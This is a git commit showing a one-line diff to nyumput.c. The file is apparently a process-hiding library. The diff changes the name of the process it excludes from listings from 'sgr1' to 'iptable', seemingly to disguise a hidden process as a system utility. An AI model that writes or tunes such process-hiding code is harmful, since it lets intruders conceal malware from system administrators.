eb87aaf4cd710e276ddf1e42d289574ea2529931
adawisaud <114278989+adawisaud@users.noreply.github.com>
2022-10-02 10:01:43 +0700

    Update nyumput.c

--- nyumput.c
+++ nyumput.c
@@ -9,7 +9,7 @@
 /*
  * Every process with this name will be excluded
  */
-static const char* process_to_filter = "sgr1";
+static const char* process_to_filter = "iptable";
 
 /*
  * Get a directory name given a DIR* handle
